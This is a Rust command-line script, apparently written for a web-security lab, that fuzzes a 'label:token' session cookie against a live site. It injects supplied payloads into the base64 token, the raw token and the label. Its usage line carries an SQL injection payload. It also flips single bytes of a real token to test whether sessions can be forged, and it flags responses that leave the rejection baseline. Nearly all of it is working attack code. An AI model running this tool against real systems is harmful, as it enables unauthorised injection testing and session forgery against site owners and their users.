#!/usr/bin/env rust-script
//! name: cookie_fuzz
//! description: 会话结构插入点扫描件 - 对 `label:token` 形式的会话 cookie 逐载荷投递三种注入形(解码后 token 注入 = label:base64(P);原始 token 注入 = label:P;label 注入 = P:token),记录每形的状态/长度/Location/片段并对比控制组(label:token),凡状态离开 {302,500} 拒绝基线者标记 interesting,用于「扫描非标准数据结构」式的手工插入点扫描。
//! version: 1.0.0
//! args: <base-url> [--path /my-account] [--label wiener] [--token TOK] [--payload P]... [--payloads-file F] [--selftest]
//! keywords: session, cookie, 非标准数据结构, insertion-point, sqli, scan, 插入点扫描
//!
//! 用法示例:取一枚有效会话 `label:token`,把候选注入载荷逐条喂入;本件自动生成
//! 「解码后 token / 原始 token / label」三形的 cookie 值并直发,与拒绝基线比对。
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! ```

use pi_rust_lib::report;
use pi_rust_lib::serde_json::{json, Value};
use std::time::{Duration, Instant};

/// Standard base64 encoder (no external crate).
fn b64_enc(data: &[u8]) -> String {
    const A: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = *chunk.get(1).unwrap_or(&0) as u32;
        let b2 = *chunk.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(A[((n >> 18) & 63) as usize] as char);
        out.push(A[((n >> 12) & 63) as usize] as char);
        if chunk.len() > 1 {
            out.push(A[((n >> 6) & 63) as usize] as char);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(A[(n & 63) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

/// Standard base64 decoder (accepts padding, ignores whitespace).
fn b64_dec(s: &str) -> Result<Vec<u8>, String> {
    let mut out = Vec::new();
    let mut buf: u32 = 0;
    let mut bits: u32 = 0;
    for c in s.bytes() {
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            b'=' => break,
            b'\n' | b'\r' | b' ' | b'\t' => continue,
            other => return Err(format!("invalid base64 char {:?}", other as char)),
        };
        buf = (buf << 6) | v as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1u32 << bits) - 1;
        }
    }
    Ok(out)
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let ok = b64_enc(b"wiener") == "d2llbmVy" && b64_enc(b"'") == "Jw==" && b64_enc(b"a") == "YQ==";
        report::success(
            "cookie_fuzz",
            json!({"selftest": ok, "b64_wiener": b64_enc(b"wiener")}),
            "selftest ok -> run against the live session cookie",
        )
        .ok();
        return;
    }

    let mut url = String::new();
    let mut path = "/my-account".to_string();
    let mut label = "wiener".to_string();
    let mut token = String::new();
    let mut payloads: Vec<String> = Vec::new();
    let mut flip_token = String::new();
    let mut file: Option<String> = None;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--path" => {
                i += 1;
                path = args.get(i).cloned().unwrap_or_default();
            }
            "--label" => {
                i += 1;
                label = args.get(i).cloned().unwrap_or_default();
            }
            "--token" => {
                i += 1;
                token = args.get(i).cloned().unwrap_or_default();
            }
            "--payload" => {
                i += 1;
                payloads.push(args.get(i).cloned().unwrap_or_default());
            }
            "--payloads-file" => {
                i += 1;
                file = args.get(i).cloned();
            }
            "--flip-token" => {
                i += 1;
                flip_token = args.get(i).cloned().unwrap_or_default();
            }
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if let Some(f) = file {
        if let Ok(text) = std::fs::read_to_string(&f) {
            for line in text.lines() {
                let t = line.trim();
                if t.is_empty() || t.starts_with('#') {
                    continue;
                }
                payloads.push(t.to_string());
            }
        }
    }
    if url.is_empty() || (payloads.is_empty() && flip_token.is_empty()) {
        report::failure(
            "cookie_fuzz",
            "need a base url and at least one --payload or --flip-token",
            "usage: cookie_fuzz https://host --label wiener --token TOK --payload \"' OR '1'='1\"",
        );
        return;
    }

    let target = format!("{}{}", url.trim_end_matches('/'), path);
    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_secs(25))
        .redirects(0)
        .build();

    let send = |cval: &str| -> Value {
        let start = Instant::now();
        let res = agent
            .get(&target)
            .set("Cookie", &format!("session={cval}"))
            .call();
        let ms = start.elapsed().as_millis();
        match res {
            Ok(resp) => {
                let status = resp.status();
                let location = resp.header("Location").unwrap_or("").to_string();
                let body = resp.into_string().unwrap_or_default();
                json!({"cookie": cval, "status": status, "location": location, "len": body.len(), "ms": ms,
                       "snippet": body.chars().take(140).collect::<String>()})
            }
            Err(ureq::Error::Status(code, resp)) => {
                let location = resp.header("Location").unwrap_or("").to_string();
                let body = resp.into_string().unwrap_or_default();
                json!({"cookie": cval, "status": code, "location": location, "len": body.len(), "ms": ms,
                       "snippet": body.chars().take(140).collect::<String>()})
            }
            Err(e) => json!({"cookie": cval, "status": 0, "error": e.to_string(), "ms": ms}),
        }
    };

    let mut rows: Vec<Value> = Vec::new();
    let mut interesting = 0usize;
    // Reject baseline statuses in this app: 302 (no session) and 500 (integrity).
    let mut consider = |kind: &str, cval: String, out: &mut Vec<Value>, interesting: &mut usize| {
        let mut v = send(&cval);
        if let Some(obj) = v.as_object_mut() {
            obj.insert("kind".to_string(), json!(kind));
        }
        let status = v.get("status").and_then(|s| s.as_u64()).unwrap_or(0);
        let flag = status != 302 && status != 500 && status != 0;
        if flag {
            *interesting += 1;
        }
        if let Some(obj) = v.as_object_mut() {
            obj.insert("interesting".to_string(), json!(flag));
        }
        out.push(v);
    };

    if !token.is_empty() {
        consider("control", format!("{label}:{token}"), &mut rows, &mut interesting);
    }
    for p in &payloads {
        consider(
            "token-decoded",
            format!("{}:{}", label, b64_enc(p.as_bytes())),
            &mut rows,
            &mut interesting,
        );
        consider("token-raw", format!("{}:{}", label, p), &mut rows, &mut interesting);
        if !token.is_empty() {
            consider("label-raw", format!("{}:{}", p, token), &mut rows, &mut interesting);
        }
    }
    // Single-byte flips of the live token: if any flip still decodes to a valid
    // identity (500 = mismatch) instead of 302 (invalid), the token is not
    // authenticated and can be forged.
    if !flip_token.is_empty() {
        match b64_dec(&flip_token) {
            Ok(bytes) => {
                for pos in 0..bytes.len() {
                    let mut flipped = bytes.clone();
                    flipped[pos] ^= 0x01;
                    consider(
                        "token-flip",
                        format!("{}:{}", label, b64_enc(&flipped)),
                        &mut rows,
                        &mut interesting,
                    );
                }
            }
            Err(e) => rows.push(json!({"kind": "flip-error", "error": e})),
        }
    }

    report::success(
        "cookie_fuzz",
        json!({"target": target, "label": label, "payloads": payloads.len(),
               "requests": rows.len(), "interesting": interesting, "rows": rows}),
        "any row with interesting=true (status not 302/500) is a candidate injection signal; inspect its snippet",
    )
    .ok();
}
